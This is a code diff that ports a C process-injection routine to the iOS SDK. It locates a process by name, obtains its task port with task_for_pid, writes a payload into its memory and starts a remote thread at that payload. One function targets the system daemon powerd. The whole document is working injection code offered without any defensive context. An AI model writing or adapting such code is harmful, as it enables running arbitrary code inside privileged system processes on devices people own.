@@ -2,7 +2,12 @@
 #include <sys/sysctl.h>
 #include <stdlib.h>
 #include <string.h>
-#include <mach/mach_vm.h>
+/* mach_vm.h is macOS-only and explicitly unsupported in the iOS SDK.
+ * Use the older vm_allocate / vm_write APIs (vm_address_t / vm_offset_t)
+ * which are available on iOS via <mach/mach.h>. */
+#include <mach/mach.h>
+#include <mach/vm_map.h>
+
 pid_t find_pid_by_name(const char *name) {
     struct kinfo_proc *procs = NULL;
     size_t count = 0;
@@ -22,15 +27,20 @@ pid_t find_pid_by_name(const char *name) {
     free(procs);
     return -1;
 }
+
 kern_return_t inject_into_pid(pid_t target, const void *payload, size_t size) {
     task_t remote_task;
     kern_return_t kr = task_for_pid(mach_task_self(), target, &remote_task);
     if (kr != KERN_SUCCESS) return kr;
-    mach_vm_address_t remote_addr = 0;
-    kr = mach_vm_allocate(remote_task, &remote_addr, size, VM_FLAGS_ANYWHERE);
+
+    /* vm_address_t / vm_allocate are available in the iOS SDK */
+    vm_address_t remote_addr = 0;
+    kr = vm_allocate(remote_task, &remote_addr, size, VM_FLAGS_ANYWHERE);
     if (kr != KERN_SUCCESS) return kr;
-    kr = mach_vm_write(remote_task, remote_addr, (vm_offset_t)payload, size);
+
+    kr = vm_write(remote_task, remote_addr, (vm_offset_t)payload, (mach_msg_type_number_t)size);
     if (kr != KERN_SUCCESS) return kr;
+
     arm_thread_state64_t state = {0};
     state.__pc = (uint64_t)remote_addr;
     state.__sp = (uint64_t)remote_addr + size - 0x1000;
@@ -40,6 +50,7 @@ kern_return_t inject_into_pid(pid_t target, const void *payload, size_t size) {
                                &remote_thread);
     return kr;
 }
+
 void inject_powerd(const void *payload, size_t size) {
     pid_t pid = find_pid_by_name("powerd");
     if (pid > 0) inject_into_pid(pid, payload, size);
